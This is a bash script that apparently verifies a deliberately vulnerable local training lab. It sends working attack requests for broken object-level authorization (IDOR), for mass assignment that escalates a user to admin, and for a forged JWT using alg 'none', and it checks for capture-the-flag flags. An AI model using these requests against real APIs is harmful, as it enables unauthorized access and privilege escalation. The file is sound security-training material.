#!/bin/bash

BASE_URL="http://127.0.0.1:80/vul/overpermission/api"

echo "=============================================="
echo "    🚀 Starting Phase 5 Verification 🚀     "
echo "=============================================="

# 1. BOLA (API IDOR)
echo -n "[1] Testing BOLA (API IDOR)... "
RES=$(curl -s "${BASE_URL}/user_info.php?uid=8888")
if echo "$RES" | grep -q "FLAG{B0LA_ID0R_M4ST3R}"; then
    echo "PASS ✅"
else
    echo "FAIL ❌"
    echo "Response: $RES"
    exit 1
fi

# 2. Mass Assignment
echo -n "[2] Testing Mass Assignment... "
RES=$(curl -s -X PUT "${BASE_URL}/update_profile.php" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com", "phone":"123", "role":"admin"}')
if echo "$RES" | grep -q '"role":"admin"'; then
    echo "PASS ✅"
else
    echo "FAIL ❌"
    echo "Response: $RES"
    exit 1
fi

# 3. JWT Security
echo -n "[3] Testing JWT Forgery (alg: none)... "
# Header: {"typ":"JWT","alg":"none"} -> eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
# Payload: {"uid":1001,"username":"lucy","role":"admin"} -> eyJ1aWQiOjEwMDEsInVzZXJuYW1lIjoibHVjeSIsInJvbGUiOiJhZG1pbiJ9
JWT_FORGED="eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1aWQiOjEwMDEsInVzZXJuYW1lIjoibHVjeSIsInJvbGUiOiJhZG1pbiJ9."

RES=$(curl -s -X POST "${BASE_URL}/admin_dashboard.php" \
    -H "Authorization: Bearer ${JWT_FORGED}")
if echo "$RES" | grep -q "FLAG{JWT_F0RG3RY_M4ST3R}"; then
    echo "PASS ✅"
else
    echo "FAIL ❌"
    echo "Response: $RES"
    exit 1
fi

echo "=============================================="
echo "    🎉 ALL PHASE 5 MODULES PASSED! 🎉      "
echo "=============================================="
exit 0
